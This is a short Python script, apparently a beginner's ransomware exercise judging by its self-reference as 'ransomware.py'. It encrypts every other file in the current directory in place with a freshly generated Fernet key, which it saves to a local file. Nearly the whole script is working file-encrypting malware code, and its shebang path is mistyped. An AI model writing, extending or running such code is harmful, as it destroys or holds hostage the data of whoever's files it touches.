#!user/bin/env python3 

import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
	if file == "ransomware.py" or file == "the_key" or file =="prev.py" :
		continue
	if os.path.isfile(file):
		files.append(file)
print(files)

key=Fernet.generate_key()

with open("the_key" , "wb" ) as the_key:
	the_key.write(key)

for file in files:
	with open(file,"rb") as the_file:
		context=the_file.read()
	encrypted=Fernet(key).encrypt(context)
	with open(file,"wb") as the_file:
		the_file.write(encrypted)
		
